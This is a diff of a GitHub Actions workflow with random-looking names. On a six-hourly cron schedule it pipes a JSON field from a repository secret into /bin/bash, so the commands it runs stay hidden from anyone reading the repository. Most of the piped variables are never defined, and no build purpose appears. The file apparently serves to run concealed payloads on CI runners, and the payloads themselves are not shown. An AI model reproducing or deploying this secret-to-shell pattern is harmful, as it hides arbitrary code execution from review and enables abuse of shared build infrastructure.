@@ -1,32 +1,26 @@
 name: tangbuzhi5678
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 4/6 * * *'
+    - cron: '30 1/6 * * *'
 
-jobs:  # 17910
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tangbuzhi5678
         env:
-          rhah2: ${{ secrets.rhah2 }}
+          oeokt04007: ${{ secrets.oeokt04007 }}
         run: |
-          echo $rhah2 | jq -r .h4266 | /bin/bash
-          echo $sxb7 | jq -r .oyjq554 | /bin/bash
-          echo $pyk69 | jq -r .z197 | /bin/bash
-          echo $qeqti318 | jq -r .w69 | /bin/bash
-          echo $eshua08223 | jq -r .qtti4842 | /bin/bash
-          echo $lp7 | jq -r .bf582 | /bin/bash
-          echo $ypoz2 | jq -r .zyh77479 | /bin/bash
-          echo $ewxej75557 | jq -r .q02860 | /bin/bash
-          echo $glqm561 | jq -r .i14660 | /bin/bash
-          echo $iieti6492 | jq -r .mz292 | /bin/bash
-          echo $xitmk9 | jq -r .rewo535 | /bin/bash
-          echo $u8438 | jq -r .phfty0094 | /bin/bash
-          echo $reuz7450 | jq -r .ldv208 | /bin/bash
-          echo $j465 | jq -r .ck2131 | /bin/bash
-          echo $fy4399 | jq -r .fz817 | /bin/bash
+          echo $oeokt04007 | jq -r .elaa4657 | /bin/bash
+          echo $spsk29138 | jq -r .a3 | /bin/bash
+          echo $ayj0 | jq -r .kq2 | /bin/bash
+          echo $qy43185 | jq -r .g3167 | /bin/bash
+          echo $rtvh05 | jq -r .wwkqq33665 | /bin/bash
+          echo $sqco98797 | jq -r .esb441 | /bin/bash
+          echo $rxias12 | jq -r .pxe1275 | /bin/bash
+          echo $rjrp371 | jq -r .eb964 | /bin/bash
+          echo $kc5182 | jq -r .e21 | /bin/bash
 
